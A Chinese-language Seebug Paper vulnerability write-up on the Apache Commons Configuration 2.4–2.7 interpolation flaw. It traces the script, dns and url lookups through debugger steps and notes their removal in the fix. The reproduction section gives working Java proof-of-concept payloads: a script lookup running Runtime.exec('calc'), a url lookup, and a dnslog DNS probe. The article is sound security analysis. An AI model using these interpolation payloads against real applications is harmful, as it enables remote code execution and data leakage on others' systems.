**作者：标准云  
本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：paper@seebug.org**

## 漏洞简介

![image](https://images.seebug.org/content/images/2022/10/24/1666600314000-image-20221017160631-tc8boxv.png-w331s)

Apache Commons Configuration 执行变量插值 (variable interpolation)，
允许动态评估和扩展属性。插值的标准格式是`"${prefix:name}"`，其中 "prefix" 用于查找定位执行插值
`org.apache.commons.configuration2.interpol.Lookup` 的实例。从 2.4 版到 2.7 版，默认的
Lookup 实例集包括可能导致任意代码执行或与远程服务器联系的插值器。

  * "script" - execute expressions using the JVM script execution engine (javax.script) 使用 JVM 脚本执行引擎(javax.script)执行表达式
  * "dns" - resolve dns records 解析 dns 记录
  * "url" - load values from urls, including from remote servers 从 url 加载值，包括从远程服务加载值

如果使用了不受信任的配置值，则在受影响版本中使用插值默认值的应用程序可能受到远程代码执行的影响。

## 漏洞复现

创建一个 maven 项目 添加依赖

    
    
    <dependencies>
        <!-- https://mvnrepository.com/artifact/org.apache.commons/commons-configuration2 -->
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-configuration2</artifactId>
            <version>2.7</version>
        </dependency>
    </dependencies>
    
    
    import org.apache.commons.configuration2.interpol.ConfigurationInterpolator;
    import org.apache.commons.configuration2.interpol.InterpolatorSpecification;
    
    public class ConfigurationDemo {
        public static void main(String[] args) {
            InterpolatorSpecification interpolatorSpecification = new InterpolatorSpecification.Builder().withPrefixLookups(ConfigurationInterpolator.getDefaultPrefixLookups()).withDefaultLookups(ConfigurationInterpolator.getDefaultPrefixLookups().values()).create();
            // 创建 ConfigurationInterpolator 实例
            ConfigurationInterpolator interpolator = ConfigurationInterpolator.fromSpecification(interpolatorSpecification);
            // 解析包含占位符的字符串
            System.out.printf("script: %s",interpolator.interpolate("${script:javascript:java.lang.Runtime.getRuntime().exec(\"calc\")}"));
        }
    }

![image](https://images.seebug.org/content/images/2022/10/24/1666600315000-image-20221018142458-ynucf8a.png-w331s)

## 漏洞分析

画出一整个的调试过程

![image](https://images.seebug.org/content/images/2022/10/24/1666600315000-image-20221018162748-ore9ov9.png-w331s)

通过 `ConfigurationInterpolator.interpolate()` 方法解析出 表达式的值

    
    
    import org.apache.commons.configuration2.interpol.ConfigurationInterpolator;
    import org.apache.commons.configuration2.interpol.InterpolatorSpecification;
    
    public class Demo {
        public static void main(String[] args) {
            InterpolatorSpecification interpolatorSpecification = new InterpolatorSpecification.Builder()
                    .withPrefixLookups(ConfigurationInterpolator.getDefaultPrefixLookups())
                    .withDefaultLookups(ConfigurationInterpolator.getDefaultPrefixLookups().values())
                    .create();
            ConfigurationInterpolator interpolator = ConfigurationInterpolator.fromSpecification(interpolatorSpecification);
            System.out.printf("%s", interpolator.interpolate("${env:Path}"));
        }
    }

![image](https://images.seebug.org/content/images/2022/10/24/1666600315000-image-20221018161322-ras2d7j.png-w331s)

### 漏洞调试

`org.apache.commons.configuration2.interpol.ConfigurationInterpolator#interpolate`

![image](https://images.seebug.org/content/images/2022/10/24/1666600315000-image-20221018161723-1wkwfnw.png-w331s)?

首先会调用 `looksLikeSingleVariable` 判断是否符合表达式的格式

`org.apache.commons.configuration2.interpol.ConfigurationInterpolator#looksLikeSingleVariable`

![image](https://images.seebug.org/content/images/2022/10/24/1666600315000-image-20221018161903-mpdoh7e.png-w331s)?

接着利用 `resolveSingleVariable` 对表达式进行处理

`org.apache.commons.configuration2.interpol.ConfigurationInterpolator#resolveSingleVariable`

![image](https://images.seebug.org/content/images/2022/10/24/1666600315000-image-20221018162051-xs7561p.png-w331s)

调用 `extractVariableName` 去除 `${}`

`org.apache.commons.configuration2.interpol.ConfigurationInterpolator#extractVariableName`

![image](https://images.seebug.org/content/images/2022/10/24/1666600315000-image-20221018162341-7lpv5tg.png-w331s)

接着调用 `resolve` 对表达式进行处理

`org.apache.commons.configuration2.interpol.ConfigurationInterpolator#resolve`

![image](https://images.seebug.org/content/images/2022/10/24/1666600315000-image-20221018162530-3e9mjcx.png-w331s)

首先是根据 `:` 将字符串分割，然后先利用 `fetchLookupForPrefix` 取出 lookup 的对象

`org.apache.commons.configuration2.interpol.ConfigurationInterpolator#fetchLookupForPrefix`

![image](https://images.seebug.org/content/images/2022/10/24/1666600316000-image-20221018162850-ezlrtmu.png-w331s)

`org.apache.commons.configuration2.interpol.StringLookupAdapter#lookup`

![image](https://images.seebug.org/content/images/2022/10/24/1666600316000-image-20221018163016-11b4jem.png-w331s)

`org.apache.commons.text.lookup.ScriptStringLookup#lookup`

![image](https://images.seebug.org/content/images/2022/10/24/1666600316000-image-20221018163106-goob4s1.png-w331s)

再次将表达式根据 `:` 分割开来

![image](https://images.seebug.org/content/images/2022/10/24/1666600316000-image-20221018163259-enk59eu.png-w331s)

`javax.script.AbstractScriptEngine#eval(java.lang.String)`

![image](https://images.seebug.org/content/images/2022/10/24/1666600316000-image-20221018163620-ulsoac4.png-w331s)

根据漏洞简介中 dns 和 url 都属于危险的插值器

`System.out.printf("script:
%s",interpolator.interpolate("${url:http:http://127.0.0.1:8080/}"));`

![image](https://images.seebug.org/content/images/2022/10/24/1666600316000-image-20221018164427-0w8rl6p.png-w331s)

`System.out.printf("script:
%s",interpolator.interpolate("${dns:whoami.4ey83g.dnslog.cn}"));`

![image](https://images.seebug.org/content/images/2022/10/24/1666600316000-image-20221018164704-x11w6ka.png-w331s)

## 漏洞修复

移除了三个危险的插值器 `script` 、 `dns` 和 `url`

![image](https://images.seebug.org/content/images/2022/10/24/1666600316000-image-20221018152451-4vwnc9b.png-w331s)

![image](https://images.seebug.org/content/images/2022/10/24/1666600316000-image-20221018160640-01hmtk7.png-w331s)

![image](https://images.seebug.org/content/images/2022/10/24/1666600316000-image-20221020114525-fbme1b9.png-w331s)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1994/>

